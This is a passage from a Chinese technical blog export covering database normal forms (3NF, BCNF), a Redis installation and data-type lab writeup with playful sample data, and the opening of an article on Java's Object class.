<p>在2NF中，我们可以解决1NF的两个问题：数据冗余和修改异常。这主要是将1NF中的重复的数据单独拎出来建表。但对于另外两个问题，2NF依旧存在：</p>
<ol>
<li><p>插入异常</p>
<p>假如学校新建了一个系，但是暂时还没有招收任何学生，那么是无法将系名与系主任的数据单独地添加到数据表中去。</p>
</li>
<li><p>删除异常</p>
<p>假如将某个系中所有学生相关的记录都删除，那么所有系与系主任的数据也就随之消失了（一个系所有学生都没有了，并不表示这个系就没有了）。</p>
</li>
</ol>
<h3 id="3NF"><a href="#3NF" class="headerlink" title="3NF"></a>3NF</h3><p>3NF在 2NF 的基础上，消除非主属性对码的<strong>传递函数依赖</strong>。</p>
<blockquote>
<p><strong>码</strong>是可以唯一确定一条记录的属性集合；</p>
<p><strong>非主属性</strong>是除了码中属性之外的其他属性。</p>
<p><strong>传递函数依赖</strong> 如果 Z 函数依赖于 Y，Y 函数依赖于 X，并且 X 不函数依赖于 Y，那么我们就说 Z 传递函数依赖于 X。</p>
</blockquote>
<p>还记得我们在2NF埋下的一个点吗？系名可以由学号唯一确定，系主任也可以由学号唯一确定，可是我们总觉得有那里不对。更优雅的方式应该是：学号决定系名，而系名决定系主任。这里的关键点在于 <strong>传递函数依赖</strong>，事实上，当出现传递函数依赖的时候，我们可以将这一依赖涉及到的属性们再单独拉个表出来。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/19/3NF2.webp" alt="3NF2"></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/19/3NF1.webp" alt="3NF1"></p>
<p>到此为止，我们已经解决了数据冗余、插入异常、删除异常、修改异常。这份数据库也算得上设计恰当了。</p>
<h3 id="BCNF"><a href="#BCNF" class="headerlink" title="BCNF"></a>BCNF</h3><p>BCNF： 不存在<strong>主属性</strong>对于码的部分函数依赖和传递函数依赖。</p>
<p>注意哈，我们这里讲的是主属性，而先前的几个范式都是针对的非主属性。</p>
<p>如果数据库满足第三范式，那么它一定满足第二范式。</p>
<p>如果满足BCNF，它一定满足第二、第三范式。</p>
<p>先前的几个例子中，我们由于最开始的设计规避掉了对BCNF的讨论。下面来看另一个例子。</p>
<ul>
<li>某公司有若干个仓库</li>
<li>每个仓库只能有一名管理员，一名管理员只能在一个仓库中工作</li>
<li>一个仓库中可以存放多种物品，一个物品也可以存放在不同的仓库。每种物品在每个仓库中都有对应的数量。</li>
</ul>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/19/BCFN%201.webp" alt="BCFN1"></p>
<p>我们来分析一下这个表：</p>
<ul>
<li>码：（仓库名，物品名），（管理员，物品名）</li>
<li>主属性：仓库名、物品名、管理员</li>
<li>非主属性：数量</li>
</ul>
<p>非主属性只有“数量”，而非主属性对于两个码都不存在部分函数依赖和传递函数依赖，所以这个表是符合 3NF的。但是这个表却是不符合 BCNF 的。</p>
<p>因为存在主属性对码的部分函数依赖：</p>
<ul>
<li>（仓库名，物品名）-&gt; 管理员，只要确定仓库名，即可确定管理员，所以管理员部分函数依赖于仓库名。</li>
<li>（管理员，物品名）-&gt; 仓库名，同上。</li>
</ul>
<p>那么我们要将该表进行拆分才能让物品表符合 BCNF。将该表拆分为两个表：仓库表、物品表。(注: 也可以拆分为两个表: 管理员-物品-数量表与仓库-管理员表)</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/19/BCNF2.webp" alt="BCNF1"></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/19/BCNF3.webp" alt="BCNF3"></p>
<p>我们可以来看看拆分之后解决了什么问题：</p>
<ul>
<li>如果仓库换管理员，不需要将物品表中的每一个该仓库的数据都进行修改。</li>
<li>如果物品都被删除，仓库依然存在，仓库管理员也依然于仓库存在关系</li>
<li>如果新增一个仓库，但是还没有物品，可以直接在仓库表添加一条记录即可，数据库不会出错。</li>
</ul>
<p>所以消除了主属性对码的部分函数依赖和传递函数依赖之后，数据库中的操作的异常就不再出现了。</p>
<p>结论：<strong>在 3NF 的基础上，消除主属性对码的部分函数依赖和传递函数依赖。</strong></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.zhihu.com/question/24696366/answer/29189700" target="_blank" rel="noopener">如何理解关系型数据库的常见设计范式？ - 刘慰的回答 - 知乎</a></p>
<p><a href="https://juejin.im/post/6844904183611523086#heading-20" target="_blank" rel="noopener">数据库设计的基础——数据库范式</a></p>
<p><a href="https://en.wikipedia.org/wiki/Database_normalization" target="_blank" rel="noopener">Database normalization</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>数据库系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis的安装与基本使用</title>
    <url>/2020/11/10/Redis%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>本文是记录大三上学期方向必修课 《数据管理技术》的上机实验。本学期共有四次实验。</p>
<ol>
<li>Hadoop环境搭建与配置 </li>
<li>HBase数据库的部署与配置 </li>
<li>Redis数据库的部署与配置</li>
<li>Redis中数据类型使用及命令使用 </li>
</ol>
<p>本文将主要记载后两个实验</p>
<a id="more"></a>
<h2 id="实验三-Redis数据库的部署与配置"><a href="#实验三-Redis数据库的部署与配置" class="headerlink" title="实验三: Redis数据库的部署与配置"></a>实验三: Redis数据库的部署与配置</h2><h3 id="Redis-安装"><a href="#Redis-安装" class="headerlink" title="Redis 安装"></a>Redis 安装</h3><p>相比于<code>HBsae</code>, <code>Redis</code>的安装简直太简单啦! 基本没有什么需要配置的地方。</p>
<p>在<code>Ubuntu</code>中，安装 <code>Redis</code>服务器只需要一行命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install redis-server</span><br></pre></td></tr></table></figure>
<p>启动服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-server</span><br></pre></td></tr></table></figure>
<p>启动客户端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli</span><br></pre></td></tr></table></figure>
<p>接下来就可以在这里输入命令以操控<code>Redis</code>了</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379 ping</span><br><span class="line">PONG</span><br></pre></td></tr></table></figure>
<p>注：主机为 127.0.0.1，端口为 6379，下略</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/10/redis%20%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%AE%A2%E6%88%B7%E7%AB%AF.png" alt="redis 服务器 客户端"></p>
<h3 id="Redis-配置"><a href="#Redis-配置" class="headerlink" title="Redis 配置"></a>Redis 配置</h3><p>我们还是来看一下<code>Redis</code>的配置。在<code>Redis</code>的根目录中有一个配置文件（<code>redis.conf</code>）。可以通过<code>Redis CONFIG</code>命令获取和设置所有<code>Redis</code>配置。</p>
<p>语法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONFIG GET CONFIG_SETTING_NAME</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 输入</span><br><span class="line">&gt; CONFIG GET loglevel</span><br><span class="line"># 输出 以loglevel为键的KV对</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 显示所有配置项，输入：</span><br><span class="line">&gt; CONFIG GET *</span><br><span class="line"># 输出见下</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/10/%E6%9F%A5%E7%9C%8B%E5%85%A8%E9%83%A8%E9%94%AE.png" alt="查看全部键"></p>
<p>我们接下来配置登录密码，语法为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE</span><br></pre></td></tr></table></figure>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; CONFIG SET requirepass 123456</span><br></pre></td></tr></table></figure>
<p>再次尝试命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ping</span><br><span class="line">(error)</span><br><span class="line">&gt; auth 123456</span><br><span class="line">OK</span><br><span class="line">&gt; ping</span><br><span class="line">PONG</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/10/%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81.png" alt="设置密码"></p>
<p>更多配置项可参考 <a href="http://doc.redisfans.com/server/index.html" target="_blank" rel="noopener">官方文档</a></p>
<h2 id="实验四：Redis中数据类型使用及命令使用"><a href="#实验四：Redis中数据类型使用及命令使用" class="headerlink" title="实验四：Redis中数据类型使用及命令使用"></a>实验四：Redis中数据类型使用及命令使用</h2><h3 id="教师-学生信息管理系统"><a href="#教师-学生信息管理系统" class="headerlink" title="教师-学生信息管理系统"></a>教师-学生信息管理系统</h3><p>利用<code>Redis</code>架设 教师-学生信息管理系统</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>工号</th>
<th>姓名</th>
<th>年龄</th>
<th>职称</th>
<th>收入</th>
<th>教授课程</th>
</tr>
</thead>
<tbody>
<tr>
<td>100001</td>
<td>章北海</td>
<td>42</td>
<td>副教授</td>
<td>12000</td>
<td>基础伪装学，心理学实战应用</td>
</tr>
<tr>
<td>100002</td>
<td>汪淼</td>
<td>49</td>
<td>讲师</td>
<td>9000</td>
<td>材料学入门</td>
</tr>
<tr>
<td>100003</td>
<td>罗辑</td>
<td>38</td>
<td>讲师</td>
<td>7500</td>
<td>逻辑学，威慑导论</td>
</tr>
<tr>
<td>100004</td>
<td>张召忠</td>
<td>56</td>
<td>教授</td>
<td>15000</td>
<td>战略忽悠学，简明海战学</td>
</tr>
</tbody>
</table>
</div>
<p>类型为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">teacher-&lt;id&gt;:name	String</span><br><span class="line">teacher-&lt;id&gt;:age	String</span><br><span class="line">teacher-&lt;id&gt;:title	String</span><br><span class="line">teacher-&lt;id&gt;:salary	String</span><br><span class="line">teacher-&lt;id&gt;:course	Set</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>专业</th>
<th>参加的社团</th>
<th>课程成绩</th>
</tr>
</thead>
<tbody>
<tr>
<td>180100996</td>
<td>杰克马</td>
<td>英语</td>
<td>支教社，口语角，福报协会</td>
<td>略</td>
</tr>
<tr>
<td>180100997</td>
<td>强东刘</td>
<td>社会学</td>
<td>好兄弟俱乐部</td>
<td>略</td>
</tr>
<tr>
<td>180200007</td>
<td>红颜李</td>
<td>信息管理</td>
<td>无人车工作室，怡宝洗头社</td>
<td>略</td>
</tr>
</tbody>
</table>
</div>
<p>类型为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">student-&lt;id&gt;:name	String</span><br><span class="line">student-&lt;id&gt;:major	String</span><br><span class="line">student-&lt;id&gt;:clubs	List</span><br><span class="line">student-&lt;id&gt;:scores	Hash</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set &#39;teacher-100001:name&#39; &#39;章北海&#39;</span><br><span class="line">set &#39;teacher-100001:age&#39; &#39;42&#39;</span><br><span class="line">set &#39;teacher-100001:title&#39; &#39;副教授&#39;</span><br><span class="line">set &#39;teacher-100001:salary&#39; &#39;12000&#39;</span><br><span class="line">sadd &#39;teacher-100001:course&#39; &#39;基础伪装学&#39; &#39;心理学实战应用&#39;</span><br><span class="line"></span><br><span class="line">set &#39;teacher-100002:name&#39; &#39;汪淼&#39;</span><br><span class="line">set &#39;teacher-100002:age&#39; &#39;49&#39;</span><br><span class="line">set &#39;teacher-100002:title&#39; &#39;讲师&#39;</span><br><span class="line">set &#39;teacher-100002:salary&#39; &#39;9000&#39;</span><br><span class="line">sadd &#39;teacher-100002:course&#39; &#39;材料学入门&#39;</span><br><span class="line"></span><br><span class="line">set &#39;teacher-100003:name&#39; &#39;罗辑&#39;</span><br><span class="line">set &#39;teacher-100003:age&#39; &#39;38&#39;</span><br><span class="line">set &#39;teacher-100003:title&#39; &#39;讲师&#39;</span><br><span class="line">set &#39;teacher-100003:salary&#39; &#39;7500&#39;</span><br><span class="line">sadd &#39;teacher-100003:course&#39; &#39;逻辑学&#39; &#39;威慑导论&#39;</span><br><span class="line"></span><br><span class="line">set &#39;teacher-100004:name&#39; &#39;张召忠&#39;</span><br><span class="line">set &#39;teacher-100004:age&#39; &#39;56&#39;</span><br><span class="line">set &#39;teacher-100004:title&#39; &#39;教授&#39;</span><br><span class="line">set &#39;teacher-100004:salary&#39; &#39;15000&#39;</span><br><span class="line">sadd &#39;teacher-100004:course&#39; &#39;战略忽悠学&#39; &#39;简明海战学&#39;</span><br><span class="line"></span><br><span class="line">set &#39;student-180100996:name&#39; &#39;杰克马&#39;</span><br><span class="line">set &#39;student-180100996:major&#39; &#39;英语&#39;</span><br><span class="line">lpush &#39;student-180100996:clubs&#39; &#39;支教社&#39; &#39;口语角&#39; &#39;福报协会&#39;</span><br><span class="line">hmset &#39;student-180100996:scores&#39; &#39;基础伪装学&#39; &#39;86&#39; &#39;心理学实战应用&#39; &#39;96&#39; &#39;威慑导论&#39; &#39;100&#39;</span><br><span class="line"></span><br><span class="line">set &#39;student-180100997:name&#39; &#39;强东刘&#39;</span><br><span class="line">set &#39;student-180100997:major&#39; &#39;社会学&#39;</span><br><span class="line">lpush &#39;student-180100997:clubs&#39; &#39;好兄弟俱乐部&#39;</span><br><span class="line">hset &#39;student-180100997:scores&#39; &#39;简明海战学&#39; &#39;99&#39; </span><br><span class="line">hset &#39;student-180100997:scores&#39; &#39;心理学实战应用&#39; &#39;86&#39; </span><br><span class="line"></span><br><span class="line">set &#39;student-180200007:name&#39; &#39;红颜李&#39;</span><br><span class="line">set &#39;student-180200007:major&#39; &#39;信息管理&#39;</span><br><span class="line">rpush &#39;student-180200007:clubs&#39; &#39;无人车工作室&#39;</span><br><span class="line">rpush &#39;student-180200007:clubs&#39; &#39;怡宝洗头社&#39;</span><br><span class="line">hset &#39;student-180200007:scores&#39; &#39;基础伪装学&#39; &#39;68&#39;</span><br><span class="line">hset &#39;student-180200007:scores&#39; &#39;心理学实战应用&#39; &#39;96&#39;</span><br><span class="line">hset &#39;student-180200007:scores&#39; &#39;威慑导论&#39; &#39;84&#39;</span><br></pre></td></tr></table></figure>
<p>另：如何从文件中导入数据？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 命令存储在cmd.txt中</span><br><span class="line">redis-cli &lt; cmd.txt</span><br></pre></td></tr></table></figure>
<p>接下来依次对四种数据结构的常用操作进行测试</p>
<h3 id="Redis-数据结构及常用操作"><a href="#Redis-数据结构及常用操作" class="headerlink" title="Redis 数据结构及常用操作"></a>Redis 数据结构及常用操作</h3><p><code>Redis</code>中的数据结构主要有 String，List，Set，ZSet，Hash</p>
<h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><p>字符串是Redis的基本类型之一，用于存储字符串、整数、浮点数。</p>
<ul>
<li>对整个字符串或者字符串的其中一部分执行操作；</li>
<li>对整数和浮点数执行自增(increment)或者自减(decrement)操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; SET key value				# 设置指定 key 的值</span><br><span class="line">&gt; GET key 					# 获取指定 key 的值</span><br><span class="line">&gt; DEL key					# 删除此key以及其对应的value，这个命令对5种数据类型都适用</span><br><span class="line">&gt; STRLEN key				# 返回 key 所储存的字符串值的长度</span><br><span class="line"></span><br><span class="line">&gt; MSET key value [key value...]		# 同时设置一个或多个 key-value 对</span><br><span class="line">&gt; MGET key1 [key2..]		# 获取所有(一个或多个)给定 key 的值</span><br><span class="line"></span><br><span class="line">&gt; INCR key					# 将 key 中储存的数字值增一</span><br><span class="line">&gt; INCRBY key increment		# 将 key 所储存的值加上给定的增量值(increment)</span><br><span class="line">&gt; DECR key</span><br><span class="line">&gt; DECRBY key increment</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; set &#39;teacher-100001:age&#39; &#39;24&#39;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">&gt; del teacher-100001:age</span><br><span class="line">(integer)1</span><br><span class="line"></span><br><span class="line">&gt; mset teacher-100001:name 章北海 teacher-100001:age 42</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">&gt; strlen teacher-100001:name</span><br><span class="line">9</span><br><span class="line"></span><br><span class="line">&gt; INCR teacher-100001:age</span><br><span class="line">43</span><br><span class="line"></span><br><span class="line">&gt; mget teacher-100001:name teacher-100001:age</span><br><span class="line">1) &quot;\xe7\xab\xa0\xe5\x8c\x97\xe6\xb5\xb7&quot;</span><br><span class="line">2) &quot;43&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/10/String%20%E6%B5%8B%E8%AF%95.png" alt="String 测试"></p>
<p>注：<code>redis</code>会将汉字编码为<code>utf-8</code>存储，使用以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;set China 中国</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br><span class="line">OK</span><br><span class="line">&gt; exit</span><br><span class="line"></span><br><span class="line">qwert@ubuntu:redis-cli --raw</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/10/%E4%B8%AD%E6%96%87.png" alt="中文"></p>
<h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><p>一个链表，链表上的每个节点都包含了一个字符串</p>
<ul>
<li>从链表的两端推入或者弹出元素(队列操作)；</li>
<li>根据偏移量对链表进行修剪(trim)；</li>
<li>读取单个或者多个元素；根据值查找或者移除元素</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; LPUSH key value1 [value2]	# 将一个或多个值插入到列表头部</span><br><span class="line">&gt; RPUSH key value1 [value2]	# 在列表尾部添加一个或多个值</span><br><span class="line">&gt; LLEN key					# 获取列表长度</span><br><span class="line">&gt; LRANGE key start stop		# 获取列表指定范围内的元素</span><br><span class="line">&gt; LTRIM key start stop		# 对一个列表进行修剪(trim)，指定区间[start,stop]之外的元素都将被删除,</span><br><span class="line">&gt; LSET key index value		# 通过索引设置列表元素的值</span><br><span class="line">&gt; LPOP key					# 移出并获取列表的第一个元素</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; LPUSH student-180100996:clubs 支教社</span><br><span class="line">&gt; LPUSH student-180100996:clubs 口语角 福报协会</span><br><span class="line">&gt; RPUSH student-180100996:clubs 曹操发明了世界上第一艘航母</span><br><span class="line">&gt; LLEN student-180100996:clubs</span><br><span class="line">&gt; LRANGE student-180100996:clubs 0 10</span><br><span class="line">&gt; LTRIM student-180100996:clubs 0 2</span><br><span class="line">&gt; LRANGE student-180100996:clubs 0 10</span><br></pre></td></tr></table></figure>
<p>很让人别扭的是，这里的区间居然是左闭右闭。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/10/List%20%E6%B5%8B%E8%AF%95.png" alt="List 测试"></p>
<h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><p>包含字符串的无序收集器, 不可包含重复字符串</p>
<ul>
<li>添加、获取、移除单个元素；</li>
<li>检查一个元素是否存在于集合中；</li>
<li>计算交集、并集、差集；</li>
<li>从集合里面随机获取元素</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➢ Hash类型中的hset, hget, hmget, mdel, hlen, hvals等</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SADD key member1 [member2]		# 向集合添加一个或多个成员</span><br><span class="line">SCARD key						# 获取集合的成员数</span><br><span class="line">SDIFF key1 [key2]				# 返回第一个集合与其他集合之间的差集</span><br><span class="line">SINTER key1 [key2]				# 返回给定所有集合的交集</span><br><span class="line">SUNION key1 [key2]				# 返回所有给定集合的并集</span><br><span class="line">SISMEMBER key member			# 判断 member 元素是否是集合 key 的成员</span><br><span class="line">SMEMBERS key					# 返回集合中的所有成员</span><br><span class="line">SPOP key [count]				# 移除并返回集合中的一个随机元素</span><br><span class="line">SSCAN key cursor [MATCH pattern] [COUNT count]		# 迭代集合中的元素</span><br></pre></td></tr></table></figure>
<p>例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SADD &#39;teacher-100001:course&#39; &#39;基础伪装学&#39; &#39;心理学实战应用&#39;</span><br><span class="line">SMEMBERS teacher-100001:course</span><br><span class="line">SADD &#39;teacher-100002:course&#39; &#39;基础伪装学&#39; &#39;材料学入门&#39;</span><br><span class="line"></span><br><span class="line">SINTER teacher-100001:course teacher-100002:course</span><br><span class="line">SUNION teacher-100001:course teacher-100002:course</span><br><span class="line">SDIFF teacher-100001:course teacher-100002:course</span><br><span class="line"></span><br><span class="line">SISMEMBER teacher-100002:course 基础伪装学</span><br><span class="line">SPOP teacher-100002:course 2</span><br><span class="line">SCARD teacher-100002:course</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/10/Set%20%E6%B5%8B%E8%AF%95.png" alt="Set 测试"></p>
<h4 id="ZSet"><a href="#ZSet" class="headerlink" title="ZSet"></a>ZSet</h4><p>字符串成员(member)与浮点数分值(score)之间的<strong>有序映射</strong>，元素的排列顺序由<strong>分值的大小</strong>决定</p>
<ul>
<li>添加、获取、删除单个元素；</li>
<li>根据分值范围(range)或者成员来获取元素</li>
</ul>
<p>略，参考<a href="https://www.runoob.com/redis/redis-sorted-sets.html" target="_blank" rel="noopener">此处</a></p>
<h4 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h4><p>包含键值对的无序散列表</p>
<ul>
<li>添加、获取、移除单个键值对；</li>
<li>获取所有键值</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HSET key field value				#将哈希表 key 中的字段 field 的值设为 value </span><br><span class="line">HMSET key field1 value1 [field2 value2 ]	# 将多个 field-value对设置到哈希表 key 中</span><br><span class="line">HGET key field						# 获取存储在哈希表中指定字段的值。</span><br><span class="line">HMGET key field1 [field2]			# 获取所有给定字段的值</span><br><span class="line">HGETALL key							# 获取在哈希表中指定 key 的所有字段和值</span><br><span class="line"></span><br><span class="line">HDEL key field1 [field2]			# 删除一个或多个哈希表字段</span><br><span class="line">HLEN key							# 获取哈希表中字段的数量</span><br><span class="line">HEXISTS key field					# 查看哈希表 key 中，指定的字段是否存在。</span><br><span class="line"></span><br><span class="line">HKEYS key							# 获取所有哈希表中的字段</span><br><span class="line">HVALS key							# 获取哈希表中所有值。</span><br><span class="line"></span><br><span class="line">HINCRBY key field increment			# 为哈希表 key 中的指定字段的整数值加上增量 increment 。</span><br></pre></td></tr></table></figure>
<p>例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hset china ali 1</span><br><span class="line">hset china google 1024 hw 251</span><br><span class="line">hkeys china </span><br><span class="line">hvals china </span><br><span class="line"></span><br><span class="line">hlen china</span><br><span class="line">hdel china google</span><br><span class="line">hexists china lianxiang</span><br><span class="line"></span><br><span class="line">hincrby china ali 995</span><br><span class="line">hgetall china</span><br></pre></td></tr></table></figure>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202011/10/hash%E6%B5%8B%E8%AF%95.png" alt="hash测试"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.redis.com.cn/features-of-redis/" target="_blank" rel="noopener">官方：Redis教程</a></p>
<p><a href="https://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="noopener">菜鸟教程：Redis教程</a></p>
<p><a href="https://juejin.im/post/6844903829914271752" target="_blank" rel="noopener">掘金：认识Redis与Redis的数据结构</a></p>
<p><a href="https://juejin.im/post/6844903827712245774" target="_blank" rel="noopener">掘金：浅谈 Redis 数据结构</a>    涉及源码实现</p>
<p><a href="https://segmentfault.com/a/1190000037786578" target="_blank" rel="noopener">思否：Redis中对Hash类型的操作命令</a></p>
<p><a href="https://redis.io/commands" target="_blank" rel="noopener">Redis命令文档</a></p>
<p><a href="http://doc.redisfans.com/" target="_blank" rel="noopener">Redis命令文档中文版</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/153015977" target="_blank" rel="noopener">知乎：16000 字 Redis 面试知识点总结</a></p>
]]></content>
      <categories>
        <category>技术小记</category>
        <category>Technology_Stack</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>Redis</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础之Object类</title>
    <url>/2020/12/22/Java%E5%9F%BA%E7%A1%80%E4%B9%8B%20Object%20%E7%B1%BB/</url>
    <content><![CDATA[<p>本文记录了关于 Object 类的方法。内容包括：</p>
<ol>
<li>所有方法的功能与部分实现</li>
<li>讨论了 hashCode() 与 equal() 的关系</li>
<li>讨论了 Cloneable 接口与深浅拷贝</li>
<li>讨论了 Java 基于 wait() 与 notify（）的管程机制</li>
</ol>
<a id="more"></a>
<p>众所周知，Java 中的 Object 类是所有类的超类。也就是说任意类都会继承 Object 中的方法。</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202012/21/image-20201221013916776.png" alt="image-20201221013916776" style="zoom:67%;" /></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">Modifier and Type</th>
<th style="text-align:left">Method</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>protected Object</code></td>
<td style="text-align:left"><code>clone()</code></td>
<td style="text-align:left">Creates and returns a copy of this object.<br/>创建该对象的一个拷贝</td>
</tr>
<tr>
<td style="text-align:left"><code>boolean</code></td>
<td style="text-align:left"><code>equals(Object obj)</code></td>
<td style="text-align:left">Indicates whether some other object is “equal to” this one.<br/>判断当前对象与传入参数是否“相等”</td>
</tr>
<tr>
<td style="text-align:left"><code>protected void</code></td>
<td style="text-align:left"><code>finalize()</code></td>
<td style="text-align:left"><strong>Deprecated.</strong> The finalization mechanism is inherently problematic.<br/>不建议使用。会在对象被GC回收之前调用</td>
</tr>
<tr>
<td style="text-align:left"><code>Class&lt;?&gt;</code></td>
<td style="text-align:left"><code>getClass()</code></td>
<td style="text-align:left">Returns the runtime class of this <code>Object</code>.<br/>获取对象的类</td>
</tr>
<tr>
<td style="text-align:left"><code>int</code></td>
<td style="text-align:left"><code>hashCode()</code></td>
<td style="text-align:left">Returns a hash code value for the object.<br/>获取对象的hash值</td>
</tr>
<tr>
<td style="text-align:left"><code>void</code></td>
<td style="text-align:left"><code>notify()</code></td>
<td style="text-align:left">Wakes up a single thread that is waiting on this object’s monitor.<br/>任意唤醒一个在此对象监视器上等待的线程</td>
</tr>
<tr>
<td style="text-align:left"><code>void</code></td>
<td style="text-align:left"><code>notifyAll()</code></td>
<td style="text-align:left">Wakes up all threads that are waiting on this object’s monitor.<br/>唤醒全部在此对象监视器上等待的线程</td>
</tr>
<tr>
<td style="text-align:left"><code>String</code></td>
<td style="text-align:left"><code>toString()</code></td>
<td style="text-align:left">Returns a string representation of the object.<br/>将该对象转为字符串</td>
</tr>
<tr>
<td style="text-align:left"><code>void</code></td>
<td style="text-align:left"><code>wait()</code></td>
<td style="text-align:left">Causes the current thread to wait until it is awakened, typically by being <em>notified</em> or <em>interrupted</em>.</td>
</tr>
<tr>
<td style="text-align:left"><code>void</code></td>
<td style="text-align:left"><code>wait(long timeoutMillis)</code></td>
<td style="text-align:left">Causes the current thread to wait until it is awakened, typically by being <em>notified</em> or <em>interrupted</em>, or until a certain amount of real time has elapsed.</td>
</tr>
<tr>
<td style="text-align:left"><code>void</code></td>
<td style="text-align:left"><code>wait(long timeoutMillis, int nanos)</code></td>
<td style="text-align:left">Causes the current thread to wait until it is awakened, typically by being <em>notified</em> or <em>interrupted</em>, or until a certain amount of real time has elapsed.</td>
</tr>
</tbody>
</table>
</div>
<p>本文所有涉及到的源码来自 JDK-15</p>
<h2 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">this</span> == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="equals-与"><a href="#equals-与" class="headerlink" title="equals 与 =="></a>equals 与 ==</h3><p>Java 中的类型分为 基础类型 和 引用类型。</p>
<blockquote>
<p>注意：基本类型并不是类，也不继承 Object 类。</p>
</blockquote>
<p>对于引用类型，<code>==</code> 表示它们所引用的对象的地址是一样的，也就是它们必定指向同一个对象。</p>
<ul>
<li>从源码我们看到，equals 方法默认就是使用 <code>==</code> 进行比较。也就是说，如果没有覆盖 equals0方法。则通过 equals（）比较该类的两个对象时等价于“==”比较这两个对象。</li>
